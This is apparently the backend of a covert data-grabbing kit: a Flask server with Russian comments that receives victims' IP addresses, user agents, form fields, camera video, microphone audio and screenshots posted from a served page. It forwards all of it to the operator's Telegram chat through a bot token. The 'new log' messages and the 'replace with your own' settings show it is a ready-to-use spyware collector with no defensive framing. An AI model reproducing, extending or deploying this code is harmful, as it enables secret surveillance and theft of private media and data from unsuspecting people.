import requests
import base64
from flask import Flask, request, jsonify
from flask_cors import CORS
from datetime import datetime

app = Flask(__name__)
CORS(app)

# ========== НАСТРОЙКИ (ЗАМЕНИ НА СВОИ) ==========
BOT_TOKEN = "ТВОЙ_ТОКЕН_БОТА"
CHAT_ID = "ТВОЙ_ID_ТЕЛЕГРАМА"

def send_tg(text, file_bytes=None, filename="file"):
    """Отправка текста или файла в Telegram"""
    try:
        if file_bytes:
            url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"
            files = {"document": (filename, file_bytes, "application/octet-stream")}
            data = {"chat_id": CHAT_ID, "caption": text[:200]}
            requests.post(url, data=data, files=files, timeout=15)
        else:
            url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
            data = {"chat_id": CHAT_ID, "text": text, "parse_mode": "HTML"}
            requests.post(url, data=data, timeout=5)
    except Exception as e:
        print("TG error:", e)

@app.route("/")
def index():
    return open("index.html", encoding="utf-8").read()

@app.route("/log", methods=["POST"])
def log():
    data = request.get_json()
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    ua = request.headers.get('User-Agent', '')
    
    msg = f"<b>🎯 НОВЫЙ ЛОГ</b>\n"
    msg += f"🕒 {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
    msg += f"🌍 IP: {ip}\n"
    msg += f"📱 UA: {ua[:100]}\n\n"
    
    # Текстовые поля (исключая base64)
    text_fields = {k:v for k,v in data.items() 
                   if not k.endswith('_base64') and k not in ['audio_base64', 'video_base64', 'screen_base64']}
    
    for k, v in text_fields.items():
        if v:
            msg += f"<b>{k}</b>: {str(v)[:150]}\n"
    
    # Отправляем текст
    send_tg(msg)
    
    # Видео с камеры
    if data.get("video_base64"):
        video_bytes = base64.b64decode(data["video_base64"])
        send_tg("🎥 Видео с камеры (5 сек)", file_bytes=video_bytes, filename="video.mp4")
    
    # Аудио
    if data.get("audio_base64"):
        audio_bytes = base64.b64decode(data["audio_base64"])
        send_tg("🎙️ Аудиозапись (30 сек)", file_bytes=audio_bytes, filename="audio.webm")
    
    # Скриншот
    if data.get("screen_base64"):
        scr_bytes = base64.b64decode(data["screen_base64"])
        send_tg("🖥️ Скриншот экрана", file_bytes=scr_bytes, filename="screen.jpg")
    
    return jsonify({"ok": True})

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8080)
